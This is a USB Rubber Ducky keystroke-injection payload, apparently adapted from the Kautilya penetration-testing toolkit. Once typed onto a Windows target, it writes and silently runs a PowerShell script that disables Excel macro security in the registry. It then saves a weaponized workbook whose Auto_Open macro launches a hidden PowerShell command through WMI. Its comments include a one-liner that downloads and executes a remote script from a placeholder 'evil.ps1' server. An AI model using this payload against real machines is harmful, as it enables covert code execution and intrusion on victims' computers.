REM Credits to samratashok @ https://github.com/samratashok/Kautilya/blob/master/lib/src/drop_excel.ino
REM This payload drops an infected/weaponized MS Excel file on a target.
REM It is able to execute a PowerShell command or one-liner on the target.
REM To execute scripts use this: IEX ((New-Object Net.WebClient).DownloadString('http://yourwebserver/evil.ps1'));EvilFunction
REM To use scripts from Nishang (https://github.com/samratashok/nishang) use above.
REM For example, IEX ((New-Object Net.WebClient).DownloadString('http://yourwebserver/Get-Information.ps1'));Get-Information
REM See this blog post for detailed usage: http://www.labofapenetrationtester.com/2015/01/dropping-weaponized-files-using-hid.html
REM 
REM Replace $COMMAND and $FILENAME
REM WIN8CMD can be replaced with WIN7CMD
DELAY 1000
WIN8CMD
DELAY 500
STRING echo $exl = New-Object -ComObject Excel.Application > %temp%\\dexl.ps1
STRING echo $Pld = \"powershell.exe -WindowStyle hidden -ep bypass -nologo -noprofile -c $COMMAND \" >> %temp%\\dexl.ps1
STRING echo $OFile = \"$FILENAME\" >> %temp%\\dexl.ps1
STRING echo $exlV = $exl.Version >> %temp%\\dexl.ps1
STRING echo if (($exlV -eq \"12.0\") -or  ($exlV -eq \"11.0\")){ >> %temp%\\dexl.ps1
STRING echo $exl.DisplayAlerts = $False} >> %temp%\\dexl.ps1
STRING echo else {$exl.DisplayAlerts = \"wdAlertsNone\"} >> %temp%\\dexl.ps1
STRING echo New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\$exlV\\excel\\Security\" -Name AccessVBOM -Value 1 -PropertyType DWORD -Force ^| Out-Null >> %temp%\\dexl.ps1
STRING echo New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\$exlV\\excel\\Security\" -Name VBAWarnings -Value 1 -PropertyType DWORD -Force ^| Out-Null >> %temp%\\dexl.ps1
STRING echo $ce = @^\" >> %temp%\\dexl.ps1
STRING echo Sub Auto_Open() >> %temp%\\dexl.ps1
STRING echo Execute >> %temp%\\dexl.ps1
STRING echo End Sub >> %temp%\\dexl.ps1
STRING echo Public Function Execute() As Variant >> %temp%\\dexl.ps1
STRING echo Const HIDDEN_WINDOW = 0 >> %temp%\\dexl.ps1
STRING echo strComputer = \".\" >> %temp%\\dexl.ps1
STRING echo Set objWMIService = GetObject(\"winmgmts:\\\\\" ^& strComputer ^& \"\\root\\cimv2\") >> %temp%\\dexl.ps1
STRING echo Set objStartup = objWMIService.Get(\"Win32_ProcessStartup\") >> %temp%\\dexl.ps1
STRING echo Set objConfig = objStartup.SpawnInstance_ >> %temp%\\dexl.ps1
STRING echo objConfig.ShowWindow = HIDDEN_WINDOW >> %temp%\\dexl.ps1
STRING echo Set objProcess = GetObject(\"winmgmts:\\\\\" ^& strComputer ^& \"\\root\\cimv2:Win32_Process\") >> %temp%\\dexl.ps1
STRING echo objProcess.Create \"$Pld\", Null, objConfig, intProcessID >> %temp%\\dexl.ps1
STRING echo End Function >> %temp%\\dexl.ps1
STRING echo ^\"@ >> %temp%\\dexl.ps1
STRING echo $Wbk = $exl.Workbooks.Add(1) >> %temp%\\dexl.ps1
STRING echo $Wst=$Wbk.WorkSheets.item(1) >> %temp%\\dexl.ps1
STRING echo $ExlM = $Wbk.VBProject.VBComponents.Add(1) >> %temp%\\dexl.ps1
STRING echo $ExlM.CodeModule.AddFromString($ce) >> %temp%\\dexl.ps1
STRING echo $Wbk.SaveAs($OFile, 18) >> %temp%\\dexl.ps1
STRING echo $exl.WorkBooks.Close() >> %temp%\\dexl.ps1
STRING echo $exl.quit() >> %temp%\\dexl.ps1
STRING echo [System.Runtime.Interopservices.Marshal]::ReleaseComObject($exl) >> %temp%\\dexl.ps1
STRING echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\dexl.vbs
STRING echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\dexl.ps1\"),0,true >> %temp%\\dexl.vbs
DELAY 1000
STRING wscript %temp%\\dexl.vbs
DELAY 3000
STRING exit